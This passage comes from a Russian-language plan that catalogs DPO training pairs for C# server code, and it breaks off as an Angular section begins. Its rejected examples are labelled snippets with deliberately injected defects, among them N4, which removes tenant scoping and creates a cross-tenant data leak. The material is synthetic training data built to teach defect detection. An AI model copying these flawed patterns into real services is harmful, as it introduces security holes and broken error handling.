**(в) Пер-доменные проверки `IndependentDomainScorer` (server-code ось — карта §3 строка 3:
«форма-валидность компиляции, контрактные проверки DNA-паттернов, рубрики code-review
quality-gates `RAG-07`»; детерминированный eval-only судья; пороги/веса — per-WO деталь, WO
может только УЖЕСТОЧИТЬ):**
1. **structured-JSON валидность** ответа учителя (невалидный кандидат — вне argmax);
2. **compile-shape:** `goal_text` парсится как валидный C#-метод (Roslyn-парс без error-диагностик);
   сигнатура == интерфейс-контракту из `input_context` (I/O-инвариант);
3. **Rule-1-контракт (DNA):** каждый return-путь отдаёт `DataProcessResult<T>`; структурные
   детекторы запрещённых конструкций: `throw` в теле бизнес-метода (провал = класс
   `dna_throw_for_business_logic`), `return null` (класс `dna_null_or_bare_bool_return`),
   bare-bool-выход;
4. **Rule-2-контракт (fabric-first):** обращения к инфраструктуре только через интерфейсные поля
   класса; `new <конкретный провайдер>(...)` в теле метода (провал = класс
   `dna_concrete_dependency_bypass`);
5. **rubric-чеки `RAG-07` (применимый Tier-1 сабсет — ОСИ, не коды негативов):** `tenantIsolationArbiter`
   — записываемый/читаемый документ несёт tenant-scope, cross-tenant маскируется под not-found
   (ACCEPT: `tenant_id` из контекста как WHERE-binding, отсутствие→отказ, cross-tenant→404; REJECT:
   `tenant_id` опционален/из URL, default→global/superadmin — `RAG-07` :450); `idempotentCreateArbiter`
   — create-класс мутации детерминированно идемпотентен, повтор не создаёт запись (AIP-133,
   GOOGLE-AIP);
6. **cancellation/error-mapping:** каждый async fabric-вызов получает `cancellationToken`;
   `Error.Code`/`Message` фабрики сохранены в Failure-ветке;
7. **tests-present (ось объявлена, в ЭТОЙ паре спит):** для slice-задач, где work-order просит
   тест, ось требует наличие/обновление теста (`Xiigen.Flow.*.Tests` — живая структура flows-репо);
   данная unit-level задача теста не просит — ось не активна, что честно записано (не «пройдена»).

Решение гейта (наш `ChosenSelectionRule`, plan-09 :497–:498): `Y_goal := argmax_k Score(g_k)`
(best-of-K ЦЕЛИ учителя, `k_generations=4` PROPOSED_DEFAULT); `chosen = Y_goal ⇔ Score(Y_goal) >
Score(Y_best)`, ничья/НЕТ → `chosen = Y_best` (лучший кандидат УЧЕНИКА). Судейские скоры
(compile-shape/DNA-детекторы/rubric-чеки) — `preference_score`/Y_best-аудит, они НЕ авторствуют
`chosen`/`rejected` и НЕ заменяют `reward(side)` (plan-07 :355–:357). Непобедившие генерации
учителя `g_k` (k≠argmax) — eval-only.

**(г) STUDENT-проекция (типизированный unit-I/O обучаемой стороны):** server-code юнит:
`InputContext{interface_contract, class_frame, y_best_method}` → улучшенный метод (текст). В паре:
`InputContext` = контракт+рамка+черновик (БЕЗ сырого промпта пользователя — анти-replay),
`Chosen` = принятый метод, `Rejected` = дефектный вариант. Достижимость студентом (≤3–4B / узкая
специализация): единица — ОДИН короткий метод в ЖЁСТКОЙ DNA-рамке с конечным словарём паттернов
(guard-клаузы, Failure-коды, tenant-stamp, error-mapping хвост) — структурный выход, не свободное
эссе. До обучения server-code ноги студент честно отдаёт not_ready — путь
`PASS_AS_HONEST_UNTRAINED_SCAFFOLD`. Всё **[условно от M1/M2]**.

#### PE-4.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА внедрённая ошибка

Каждый негатив — Error-Injection над хорошим методом (б): полный компилируемый правдоподобный
метод (НЕ отказ, НЕ мусор — G1) с ОДНОЙ главной ошибкой; всё остальное без изменений. Коды — пять
ЯВНЫХ доменно-локальных `dna_*`, КАЖДЫЙ с названным родителем `PromptError-02 No DNA Safety`
(критический, `RAG-10` §6.3) и осью доменного скорера (в); `RAG-07`-рубрики стоят как ось скорера,
НЕ как код негатива (переякоривание против образца-Fable; single-owner FC-44). Аннотация строго
`[WRONG: код — описание — последствие]`, ровно одна главная ошибка.

**N1 — критический (DNA Rule 1; ось 3 скорера).** Валидационная ветка `Packages` заменена
исключением:
`if (request.Packages.Count == 0) { throw new ArgumentException("At least one package is required.", nameof(request)); }`
`[WRONG: dna_throw_for_business_logic (доменно-локальный; родитель PromptError-02 No DNA Safety, критический) — бизнес-исход «нет пакетов» бросает исключение вместо DataProcessResult.Failure("PACKAGE_REQUIRED",…): нарушение Rule 1; у вызывающего конвейера XIIGen нет catch-контракта на бизнес-исходы — вместо структурного кода ошибки API-граница отдаёт 500, единый error-mapping ломается]`

**N2 — DNA Rule 1 (null-выход; ось 3 скорера).** Failure-хвост записи заменён null-выходом:
`return stored.IsSuccess && stored.Data is not null ? Success(stored.Data.Body) : null;`
`[WRONG: dna_null_or_bare_bool_return (доменно-локальный; родитель PromptError-02 No DNA Safety) — путь ошибки хранения возвращает null вместо Failure с кодом фабрики: нарушение Rule 1 «never return null»; caller падает NullReferenceException при первом обращении к .IsSuccess — ошибка всплывает далеко от причины, код и сообщение ошибки фабрики потеряны]`

**N3 — DNA Rule 2 (fabric обойдён; ось 4 скорера).** Инжектированное поле `_documents` заменено
локальной конкретикой:
`var documents = new SqliteDocumentStore("Data Source=xiigen-platform.db"); var stored = await documents.UpsertAsync(ListingsCollection, id, body, cancellationToken: cancellationToken).ConfigureAwait(false);`
`[WRONG: dna_concrete_dependency_bypass (доменно-локальный; родитель PromptError-02 No DNA Safety) — метод сам инстанцирует конкретный провайдер вместо инжектированного IDocumentStore: нарушение Rule 2 Fabric-First; подмена провайдера (InMemory/Sqlite/тенант-скоуп фабрики) невозможна, юнит-тест без реальной БД невозможен, конфигурация хранилища захардкожена в бизнес-код]`

**N4 — критический (DNA tenant; ось 5 скорера `tenantIsolationArbiter`).** Строка
`["publisherTenantId"] = CurrentTenant.TenantId,` удалена из записываемого документа; всё
остальное без изменений:
`[WRONG: dna_missing_tenant_isolation (доменно-локальный; родитель PromptError-02 No DNA Safety, критический; ось скорера RAG-07 tenantIsolationArbiter, seed EXT-SEC-006, источник рубрики OWASP-ASVS :450) — листинг записан БЕЗ tenant-scope владельца: срабатывает REJECT-сигнал рубрики «tenant_id опционален / default→global»; запись становится глобальной — кросс-тенантная утечка/IDOR-класс, последующие tenant-скоуп выборки чужого тенанта видят и мутируют её]`

**N5 — DNA идемпотентность (ось 5 скорера `idempotentCreateArbiter`).** Детерминированный id
заменён случайным:
`var id = Guid.NewGuid().ToString();`
`[WRONG: dna_non_idempotent_create (доменно-локальный; родитель PromptError-02 No DNA Safety; ось скорера RAG-07 idempotentCreateArbiter, seed EXT-ARCH-006, источник рубрики GOOGLE-AIP AIP-133) — каждый вызов публикации создаёт НОВУЮ запись: срабатывает REJECT-сигнал рубрики «нет idempotency-key — каждый POST = новая запись»; сетевой retry/повторный клик пользователя плодит дубликаты листингов, upsert-семантика ListingId(flowSlug, version) разрушена]`

**Маппинг на канон (честная нота именования, single-owner FC-44):** все пять негативов несут
ЯВНЫЕ доменно-локальные коды `dna_*`, потому что среди канонических `PromptError-01..12` НЕТ
кодов для конкретных DNA-нарушений XIIGen (throw/null/concrete-dep/tenant/idempotency); каждый
код называет родительский класс `PromptError-02 No DNA Safety` (критический) — «не сваливать в
один PromptError-02» соблюдено (пять разных явных кодов, а не один недифференцированный).
`RAG-07`-рубрики (`tenantIsolationArbiter`/`idempotentCreateArbiter`) стоят как ОСЬ СКОРЕРА, не
как код негатива — переименовывать канонические имена (ни `PromptError`, ни `RAG-07`) ЗАПРЕЩЕНО
(no dual-canon). Гейты пары: G1 (каждый N — компилируемый правдоподобный метод, типичная ошибка
генератора/джуниора, не отказ и не мусор); G2/G3 (код + `[WRONG:]` присутствуют); G5 (не
почти-копия по дифф-региону — доменный гейт PE-4.4); G6 (классы типичны: DNA-нарушения — ровно
то, что DNA-рамка платформы существует чтобы запрещать, живые guard-паттерны в КАЖДОМ spot-read
сервисе; tenant/idempotency — ядро quality-gates `RAG-07`). Каждый N — ровно одна главная ошибка;
слабый негатив (например, отличие только в имени переменной) → отбраковка предохранителем
(`PromptError-08 Poor Negative Examples` / `ORCH-10 Low Signal Negative`, §1.3 п.6), НЕ обучение.

#### PE-4.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "server-code-pair-0001",
  "Level": "unit",
  "NodeOrEdgeId": "server-code/xiigen-platform/marketplace-publish-listing",
  "InputContext": { "interface_contract": "Task<DataProcessResult<IReadOnlyDictionary<string, object?>>> PublishListingAsync(PublishMarketplaceListingRequest, CancellationToken)",
                    "class_frame": "MarketplaceService : MicroserviceBase<MarketplaceService>, IMarketplaceService; поля: IDocumentStore _documents; const ListingsCollection; хелперы Success/Failure/CurrentTenant/CurrentCorrelationId; helper ListingId(flowSlug,version)",
                    "y_best_method": "<черновик Y_best из PE-4.2>" },
  "Chosen":   { "method_text": "<метод (б): валидация-first + tenant-stamping + идемпотентный id + error-mapping + cancellation>" },
  "Rejected": { "method_text": "<N1: throw для бизнес-исхода вместо Failure>" },
  "WrongMarkers": ["[WRONG: dna_throw_for_business_logic — бизнес-исход бросает исключение вместо DataProcessResult.Failure — API-граница отдаёт 500 вместо структурного кода]"],
  "Reason": "Бизнес-исходы сервисного метода платформы обязаны возвращаться структурным DataProcessResult с кодом ошибки, не исключением; DNA-рамка Xiigen.Kernel — контракт всего конвейера",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 (:389-409); заполняет детерминированный TeacherProvenanceAdapter (plan-09 :501), НЕ LLM; teacher_output_used_for_training — по исходу гейта ChosenSelectionRule; closed_proprietary_model=false (local_self_hosted_open_weight qwen35-local-v1)" },
  "SourceIds": ["xiigen-platform-marketplace-spotread", "catalog-pe4-server-code-seed-0001"],
  "HeldOut": false,
  "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

- **Поле 14 `DpoTrainReady` = `false` (согласовано с PE-2/PE-3, §1.1, §4 п.6), но с ЧЕСТНЫМ
  доменным отличием.** Доменного Phase-0-блока (как `TOKENIZER_BLOCKED` у HE_EN) в этом домене
  НЕТ: C#/латиница токенайзер не блокирует, source-корпус существует и доступен уже сейчас
  (первопартийные `Xiigen.*`-репо, живой spot-read этим пассом). `false` держат ТОЛЬКО глобальные
  предусловия: (1) до `G-DPO-FINAL` (overlay :48–:53) любой teacher-выход этапа `TP1_LOCAL` —
  eval/quarantine, никакого `TrainBatchAsync`; (2) builder/scorer/Roslyn-compile-shape-чекер/
  маршрут в коде НЕ существуют — **[условно от M1]**; (3) до импорта `RAG-07` rubric-СТРОК нужна
  `ARBITER-VOCABULARY`-нормализация 2004→23 (`RAG-07` :1302–:1304), а SWE-bench — формат/
  learning-signal референс (Python-репо), НЕ .NET-строки. Отличие от образца-Fable (тот ставил
  `true`): наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ задач — иначе `dual-live-canon`
  статуса готовности. Всё **[условно от M1 + G-DPO-FINAL]**.
- **Reward-scalarization (ОБЯЗАТЕЛЬНА по trainable-architecture-decision, SI_GATE_3 — сторона
  серверного кода НЕ атомарный ответ, а строка-СТРУКТУРА → нужен именованный `reward(side)`-
  экстрактор; наш plan-07 :341–:360, VERIFIED живым чтением).** `SerializeCandidate(side)=method_text`;
  далее каноном блока 07: `reward(side)=Beta·(policyLogP(method_text | input_context) −
  referenceLogP(method_text | input_context))`; `margin = chosenReward − rejectedReward`.
  Судейские скоры (compile-shape/DNA-детекторы/rubric-чеки) → `preference_score`/Y_best-аудит,
  они НЕ авторствуют `chosen`/`rejected` и НЕ заменяют `reward(side)` (plan-07 :355–:357). Сторону
  без сериализации/скаляризации → `REWARD_EXTRACTOR_MISSING` (plan-07 :359–:360). `margin ≤ 0.05`
  или `overlap ≥` доменный порог → `LOW_CONTRAST`, не учим (plan-07 :520).
- **CODE-OVERLAP гейт (доменное решение этого прохода — отличается И от оркестрации, И от
  переводов; обоснование, как требует CARRY PE-4.4):** одно-дефектная инъекция в ~35-строчный
  метод даёт raw token-overlap positive↔negative ≫ 0.75 by construction (почти весь метод — общая
  рамка) — окно оркестрации 0.45–0.75 в лоб забраковало бы ВСЕ реалистичные код-негативы как
  «почти-копии», а реальный код-корпус доказывает обратное: малые диффы = НОРМАЛЬНАЯ форма
  код-сигнала (SWE-bench: 2294 issue→patch пар, patch = малый дифф — `RAG-07` :397/:324).
  Переводческий 0.60 тоже не подходит (там нижней границы нет ПО ДРУГОЙ причине — наивный
  рендеринг). Доменное правило (зеркало вычитания `a_side` у переводов):
  `shared=(chosen∩rejected)−frame; total=(chosen∪rejected)−frame; overlap_ratio=shared/total`,
  где `frame` = токены `InputContext` (интерфейс-контракт + класс-рамка + `Y_best`-черновик) —
  общая рамка легальна и overlap не раздувает. Гейт ОДНОСТОРОННИЙ: `overlap_ratio > 0.75 → discard`
  (дифф-регионы сторон почти совпадают → нет контраста), нижней границы НЕТ (малый материальный
  дифф легален — SWE-bench-стиль); плюс порог материальности: изменённый регион ≥ 1 семантический
  statement — rename/whitespace/comment-only дифф → discard (класс G5). **Обязательная кавета
  (concept vs runtime):** `0.75` — КОНЦЕПТУАЛЬНЫЙ порог (перенос верхней границы 0.75 на остаток
  после вычитания рамки); runtime-мерителя НЕ существует **[условно от M1]**; калибровка порога =
  обязанность DPO-build, НЕ каталога. N1–N5 сконструированы одно-дефектными инъекциями с
  НЕПЕРЕСЕКАЮЩИМИСЯ дифф-регионами (throw-ветка / null-хвост / new-провайдер / удалённая
  tenant-строка / Guid-id) — попарный overlap дифф-регионов ≈ 0 by construction; фактический
  `overlap_ratio` меряет builder, НЕ каталог.
- **Materiality (SI_GATE_3-смежное):** сторона `chosen`/`rejected` = многострочная структура кода,
  поэтому reward скаляризован над сериализацией (см. выше); материальность негатива = изменённый
  регион несёт РОВНО ОДНО семантическое изменение поведения (не косметика) — обеспечено
  конструкцией N1–N5.
- **Fan-out (winner-vs-each-loser, SI_GATE_4):** 5 негативов на один `chosen` → 5 ОТДЕЛЬНЫХ пар
  `server-code-pair-0001..0005` (по одной на N1..N5); поле `Rejected` НИКОГДА не несёт список
  (§1.3 п.10; владелец проекции `producer-output → SourceRow[]` — builder WO-M1.1).
- **LegScope:** `common`-кандидат (Free=.NET mapping `RAG-02` + first-party XIIGen-код, приватных
  токенов нет); реальные серверные методы из ЧУЖИХ пользовательских проектов → `PersonalAdaptive`
  (`.xiigen`) до redaction+approval.
- **Source-disjoint нота (HeldOut):** train = первопартийные `Xiigen.*`-якоря (platform Marketplace
  + flows UserRegistration/EmailVerification — РАЗНЫЕ репо/семьи); held-out = ДРУГАЯ source-семья
  (кандидаты: `RAG-07` seed-строки EXT-SEC/EXT-ARCH; SWE-bench-семья — с честной нотой «Python, не
  .NET»: пригодна для held-out суждения ФОРМЫ issue→patch, не как .NET-код); `HeldOut` — поле пары;
  лексический Jaccard-guard train↔eval обязателен (§1.3 п.9).
- **Лицензии `RAG-07` (обязательная нота прохода — legal-provenance гейт, VERIFIED живым чтением
  этим пассом):** N4/N5 используют канонические ИМЕНА рубрик как ОСЬ СКОРЕРА — использование имени
  лицензией не обременено; но если реальный build ПОДТЯНЕТ их seed-СТРОКИ: `EXT-SEC-006` питается
  **OWASP-ASVS (CC-BY-SA-4.0 — share-alike ЗАРАЖАЕТ производный датасет** → держать отдельно/
  помечать, QUARANTINE-класс legal-gate; `RAG-07` :390/:91); `EXT-ARCH-006` питается **GOOGLE-AIP
  (CC-BY-4.0 — attribution required**; `RAG-07` :388). MIT-безопасное ядро server-code паттернов:
  **SWE-BENCH (MIT, TRAINING_OK; `RAG-07` :397)** + **NESTJS-ADVANCED (MIT, TRAINING_OK «только
  архитектура, не туториалы»; `RAG-07` :408)**; REACT-ADVANCED (CC-BY-4.0 attribution; `RAG-07`
  :89) — НЕ server-code источник (клиентская сторона — зона PE-5). Первопартийный `Xiigen.*`-код —
  собственность Luba, лицензионного трения нет.
- **Композиция батча (ориентир будущего DPO-build, НЕ capability-заявка):** канонического
  распределения классов для код-домена НЕТ ни в `RAG-07`, ни в `RAG-10` — честная нота;
  ориентир-аналогия: критические классы (`dna_throw_for_business_logic`, `dna_missing_tenant_isolation`)
  ≈ 25% батча, негативов 60–70% от positive; точный баланс = обязанность DPO-build, НЕ каталога.

#### PE-4.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается ДО обучения (§1.3 п.4):** `[WRONG:]` живёт в поле `WrongMarkers` и приклеен
   к `rejected`-ИСТОЧНИКУ, но из ТРЕНИРУЕМОГО `rejected`-представления срезается до токенизации —
   иначе тренер учит детекцию тега, а не качество кода.
2. **Acceptance-signal independence (plan-09 :504–:544, SI_GATE_6/SI_GATE_7):** `chosen` решает
   ТОЛЬКО детерминированный server-code-`IndependentDomainScorer` (Roslyn-парс + структурные
   DNA-детекторы + rubric-чеки); `current_output_is_already_optimal` — диагностика, скоринг
   исполняется ВСЕГДА; `acceptance_signal_source != teacher_self_report` И `!=
   trained_unit_self_confidence`; best-of-K по self-logprob учителя = `forbidden_self_label`
   (SI_GATE_7). Если ОБА (детерминированный winner-selector И judge-качество) могли бы авторствовать
   один `chosen` — ровно один назван авторитетом, другой eval/critic-only (SI_GATE_7): здесь
   авторитет — детерминированный `IndependentDomainScorer`, а не self-report.
3. **Anti-reward-hacking (§1.3 п.7 (а)–(е) + код-специфика):** (а) НЕ константный промпт — пары
   батча от ≥2 разных методов/репо (platform `MarketplaceService` + flows `EmailVerificationService`/
   `UserRegistrationService`); (б) НЕ length-hack — N1–N5 полные методы, длина ≈ длине (б) (одна
   инъекция, не огрызки; «короткий-хороший vs длинный-плохой» запрещён); (в) НЕ confidence-leakage
   — в код-текстах сторон нет confidence-полей; (г) НЕ measurement circularity — рубрика скорера
   (в) не производна от train-строк; (д) `chosen==rejected` → хард-гейт; (е) mojibake/порча скрипта
   — для C#-кода латиница малорелевантна, но русские строки/комментарии в коде под тем же гейтом;
   **(ж) КОД-СПЕЦИФИЧНЫЙ хак — НЕ форматирование-как-сигнал:** запрещён паттерн «`chosen` идеально
   отформатирован vs `rejected` с кривыми отступами» — тренер выучит форматирование, не семантику
   дефекта; whitespace-нормализация ОБЕИХ сторон до токенизации — обязанность builder'а. Смежный
   код-хак: НЕ «идентификатор-как-сигнал» (rejected с говорящими именами `badMethod`/`wrongId`) —
   имена нормализуются/абстрагируются.
4. **`PromptError-05 Deterministic Shortcut` — предохранитель СКОРЕРА (не класс негатива):** сам
   `IndependentDomainScorer` НЕ смеет быть скрытым детерминированным лукапом, выдающим себя за
   trainable-судью — он eval-only детерминированный арбитр ПО ДИЗАЙНУ и назван так честно (не
   «обученный critic»); trainable-нога — это server-code юнит-СТУДЕНТ, не скорер (allowed-level
   `ILogicalUnit`, trainable-architecture-decision).
5. **Карантин-классы (§1.3 п.11):** легальный — share-alike ASVS-производные строки → отдельная
   помеченная нога (НЕ смешивать с MIT-ядром common-датасета), закрытая проприетарная
   teacher-модель → `DATASET_REBUILD_REQUIRED`; privacy — чужой пользовательский серверный код →
   `PersonalAdaptive`/`.xiigen` до redaction+approval (`BLOCK_FOR_COMMON`); **secretPresence-ось:**
   реальные connection-strings/ключи/токены в примерах запрещены — в N3 `"Data
   Source=xiigen-platform.db"` синтетический локальный путь без секрета; настоящий секрет в строке
   = провал `secretPresence`-класса и карантин строки; leakage — `ExcludedLeakageSignals`.
6. **`margin > 0.05`** (иначе `LOW_CONTRAST`, plan-07 :520); слабый негатив → отбраковка
   предохранителем (§1.3 п.6), НЕ обучение.
7. **Честность статуса (`catalog != capability`):** каталог = plan-content; учитель Qwen3.5-9B /
   Ollama НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); Roslyn-чекер/scorer/builder/
   обучаемый server-code юнит в коде НЕ существуют — все capability-элементы **[условно от M1/M2]**;
   `Y_goal` (б) — авторская проекция ФОРМЫ живого production-метода (spot-read), НЕ выход реального
   учителя и НЕ verbatim-копия файла.

#### PE-4.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями; VERIFIED = живой spot-read этим пассом)

| Что обосновано | Источник (file:line) | Статус проверки этим пассом |
|---|---|---|
| `DataProcessResult<T>` — КЛАСС (НЕ enum-status): `bool IsSuccess`/`IsFailure`, `T? Data`, `DataProcessError? Error`, `bool FromCache`, статики Success/Failure; `record DataProcessError(Code,Message,Details)` | `xiigen-platform/src/Xiigen.Kernel/DataProcessResult.cs:3,:26–:50` | VERIFIED (живой read всего файла) |
| `MicroserviceBase<TService>` + protected static `Success<T>/Failure<T>` + `CurrentCorrelationId` + допустимый инфраструктурный throw `CurrentTenant` (InvalidOperationException); ctor = ServiceDescriptor+accessors+logger (НЕ ISessionStorage) | `.../Xiigen.Kernel/MicroserviceBase.cs:7,:9–:19,:27–:31,:33–:39` | VERIFIED (живой read всего файла) |
| Fabric-интерфейсы: `IDocumentStore.UpsertAsync(collection,id,body,expectedVersion=null,ct=default)` + `IIdempotencyStore.TryReserveAsync` + `IOutboxStore` (CancellationToken в каждой сигнатуре) | `.../Xiigen.Kernel/FabricContracts.cs:9–:27,:35–:52,:72–:80` | VERIFIED (живой read всего файла) |
| `TenantContext.TenantId` реально существует (`record TenantContext(string TenantId, …)`) — закрывает пробел образца-Fable (тот `CurrentTenant.TenantId` НЕ проверял) | `.../Xiigen.Kernel/TenantContext.cs:3–:9` | VERIFIED (живой read; сверх образца) |
| Реальный метод-якорь `PublishListingAsync`: 4 guard-клаузы (FlowId/FlowSlug/ModuleName/Packages) → Failure-коды БЕЗ throw; `publisherTenantId=CurrentTenant.TenantId`; createdAt/updatedAt/correlationId; error-mapping хвост; детерминированный `ListingId(flowSlug,version)` → идемпотентный Upsert | `.../src/Xiigen.Platform.Marketplace/MarketplaceService.cs:27–:81` (:31–:49 guards; :64 tenant; :71 correlationId; :74–:80 error-mapping; :236 ListingId) | VERIFIED (живой read всего файла; 4-й guard FlowId — сверх образца) |
| Та же DNA в flows-репо: `MicroserviceBase` + `DataProcessResult<T>` + `Failure("VALIDATION_FAILED")` (не throw) + `CancellationToken` в каждой сигнатуре | `xiigen-flows/flows/FLOW-01-user-registration/server/Xiigen.Flow.UserRegistration.Application/EmailVerificationService.cs:11,:18–:31,:38–:46` | VERIFIED (живой read головы файла) |
| 14 полей `GraphDpoPair` (канон пары, owner блок 07) | `active-codex-execution-plan-07-dpo-builder.md:246–:261` | VERIFIED (живой read) |
| Reward-scalarization: `reward(side)=Beta·(policyLogP−referenceLogP)` + `margin` + `preference_score`-only + `REWARD_EXTRACTOR_MISSING` | `active-codex-execution-plan-07-dpo-builder.md:341–:360` | VERIFIED (живой read) |
| `tenantIsolationArbiter` рубрика (ACCEPT/REJECT: tenant_id из контекста, cross-tenant→404; REJECT default→global/superadmin) + seed EXT-SEC-006 + источник OWASP-ASVS | `RAG-07-external-sources.md:450` | VERIFIED (живой grep) |
| Лицензии: SWE-BENCH MIT TRAINING_OK (:397); NESTJS-ADVANCED MIT TRAINING_OK «только архитектура» (:408); GOOGLE-AIP CC-BY-4.0 attribution (:388); OWASP-ASVS CC-BY-SA-4.0 share-alike «производные под совместимой лицензией» (:390/:91); domain B `idempotentCreate`+GOOGLE-AIP/NESTJS (:319) | `RAG-07-external-sources.md:388,:390,:397,:408,:91,:319` | VERIFIED (живой grep) |
| `idempotentCreateArbiter` рубрика (idempotency-key, AIP-133) + seed EXT-ARCH-006 (точная строка арбитра) | `RAG-07-external-sources.md:477,:293` | CITED (образец-Fable; точная :477 этим пассом не перечитана — рубрика подтверждена через domain B :319 + GOOGLE-AIP :388) |
| ARBITER-VOCABULARY нормализация 2004→23 ДО импорта rubric-строк | `RAG-07-external-sources.md:1302–:1304` | CITED (образец-Fable + PE-4 evidence_scope) |
| Free=.NET mapping (server-.NET = бесплатный tier; Angular/AngularJS/Java/SQL — платные) | `RAG-02-orchestrator-extension.md:18,:142,:933` | CITED (карта §3 каталога + образец-Fable; этим пассом файл не перечитан) |
| Bounded teacher-call Шаг 3a + budget num_ctx≈8192 + `k_generations=4` + `TeacherProvenanceAdapter` | `active-codex-execution-plan-09-auto-dpo-loop.md` §Шаг 3a :492–:502 | CITED (владелец каталога §1.1; PE-3 VERIFIED live; этим пассом через §1.1) |
| Профиль учителя `qwen35-local-v1` (num_ctx≈8192, local self-hosted open-weight) | `active-codex-execution-plan-08-legal-teacher-gate.md` §3.5.2 :779–:833 | CITED (владелец каталога §1.1/§1.4; этим пассом не перечитан) |
| `TP1_LOCAL` eval/quarantine до `G-DPO-FINAL` (`DpoTrainReady=false`, нет `TrainBatchAsync`) | `active-codex-execution-two-phase-local-remote-overlay.md` :48–:53 | CITED (владелец каталога карта; PE-2/PE-3 VERIFIED live) |
| Секция-источник переноса (перенос с переякориванием) | `PLAN-VS-VSCODE-CONTINUE-v1.md:4472–:4712` (проход PE-4 Fable) | VERIFIED (живой read) |
| DNA-правила Rule 1 (`OperationResult<T>`, no throw/null/bare bool) / Rule 2 (Fabric First) / `BaseService(ISessionStorage)` — llm_mvp_core-воплощение той же DNA-оси | `llm_mvp_core/CLAUDE.md` «The 10 Rules» + «BaseService pattern» | CITED (родственный репо, не сверялся построчно этим пассом) |

#### PE4-ЛОГ — Что добавлено + счётчики + честность

1. **Добавлено (append-only):** эта секция «Prompt-Examples проход PE-4/10 — Задача 3 — Серверный
   код» (блоки 1–6); обновлена ОДНА строка статус-таблицы §5.2 (Серверный код → ЗАПОЛНЕНО PE-4,
   маркер `[FIX-PE-4]`) и front-matter `pass` + `pass_pe4_fill` (single-owner FC-44: заголовок и
   строка статуса свипнуты в ОДНОМ шаге, `stale-status-carrier` исключён). Прочий старый текст НЕ
   переписан.
2. **Счётчики — БЕЗ изменений:** WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 — каталог =
   plan-content, не work-order; реального нового WO проход не создал (движение счётчика возможно
   только в PE-10). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут.
3. **Пакет честности:** изменён ТОЛЬКО этот файл. Примеры — ПЛАНОВЫЕ ОБРАЗЦЫ: Ollama/учитель НЕ
   вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); scorer/Roslyn-чекер/builder/обучаемый
   server-code юнит в коде НЕ существуют; `Y_best`/`Y_goal`/N1–N5 — АВТОРСКИЕ композиции
   (`SYNTHETIC_SEED`) ПО ФОРМЕ живого кода (spot-read якоря процитированы), НЕ выходы реальных
   моделей и НЕ verbatim-копии файлов; overlap-значения — целевые by construction, НЕ измеренный
   `overlap_ratio`; порог 0.75 code-гейта — концептуальный, НЕ калиброванный; токен-оценки бюджета
   — аппроксимация, не замер; продуктовый код/тесты/git-write НЕ выполнялись. **Против PE-2/PE-3
   этот проход опирается на ЖИВОЙ spot-read кода домена (kernel `DataProcessResult`/`MicroserviceBase`/
   `FabricContracts`/`TenantContext` + `MarketplaceService` целиком + голова `EmailVerificationService`),
   и он БОГАЧЕ образца-Fable:** подтверждён `TenantContext.TenantId` (образец не проверял), 4-й
   guard `FlowId`, и `DataProcessResult=класс-НЕ-enum` (замечание образца VERIFIED живьём). Spot-read
   ≠ полное чтение репо: `Xiigen.Auth`/`Xiigen.Freedom`/`Platform.Api`/Infrastructure-слои flows НЕ
   читались — расширение якорной базы = обязанность реального DPO-build. `DpoTrainReady=false` —
   ЧЕСТНЫЙ вердикт (G-DPO-FINAL + отсутствие builder), с явной нотой «доменного Phase-0-блока НЕТ»
   (отличие от HE_EN, где `false` был ещё и по токенайзеру; отличие от образца-Fable, где стоял
   `true`). Негативы N1–N5 = 5 доменно-локальных DNA-кодов, КАЖДЫЙ с родителем `PromptError-02 No
   DNA Safety` + осью скорера `RAG-07`; `RAG-07`-рубрики — ось скорера, НЕ код негатива
   (переякоривание против образца, single-owner FC-44); `ORCH`/переводческие коды в серверном коде
   НЕ используются (§2.3). Полный баланс классов (12 `PromptError` + 23 `RAG-07`-гейта) = обязанность
   DPO-build, НЕ каталога. Валидация прохода = Opus 4.8 (родитель) ДО старта PE-5 (клиентский код —
   Angular).

---
*Конец прохода PE-4/10. PE-5 (Клиентский код — Angular) стартует после валидации Opus 4.8 этого
прохода (канон-переключение PE-5: LegScope Paid=Angular по сплиту `RAG-02` → `PersonalAdaptive`,
не free-common; таксономия — доменно-локальные Angular-коды + родитель `PromptError-02`; юнит живёт
в ДВУХ текстах `.ts`+`.html`, доменный overlap-гейт переформулируется под это; живой Angular-код —
в `xiigen-flows` `flows/FLOW-NN-*/client/angular/`, обязателен spot-read).*

---

## Prompt-Examples проход PE-5/10 — Задача 4 — Клиентский код (Angular)

**[FIX-PE-5]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный
bounded architect-author прохода PE-5/10 (PLAN-ONLY, R2: ни продуктового кода, ни
тестов, ни ollama, ни git-write; правился ТОЛЬКО этот файл; наш план 07/08/09/overlay,
RAG-02/07 и живой Angular-код `xiigen-flows` читались read-only). **Авторитет:** живая
unquoted-директива Luba 2026-07-13 (каталог примеров промптов positive/negative под 8
задач, «в соответствии с реализацией», переносом из плана-источника с переякориванием на
наш канон) + вердикт Opus 4.8 на PE-4 — VALID. Содержание = заполненный шаблон §2.1 для
задачи 4 «Клиентский код». Перенос из секции-источника «Prompt-Examples проход 5/10 (Fable)»
(`PLAN-VS-VSCODE-CONTINUE-v1.md` :4716–:4940): ярлыки источника `2PH-2.x/2PH-3.x/PE-1.x/R-08`
переякорены на наши блоки 07/08/09 + overlay + §1–§5. Второй канон НЕ создаётся.

**Канон-переключение против PE-4 (по праву §2.3 + напоминания CARRY PE-4→PE-5):**
- **(а) Таксономия негативов клиентского кода = ЯВНЫЕ доменно-локальные Angular-коды**
  (`ng_unmanaged_subscription_leak`, `ng_http_in_component_service_bypass`,
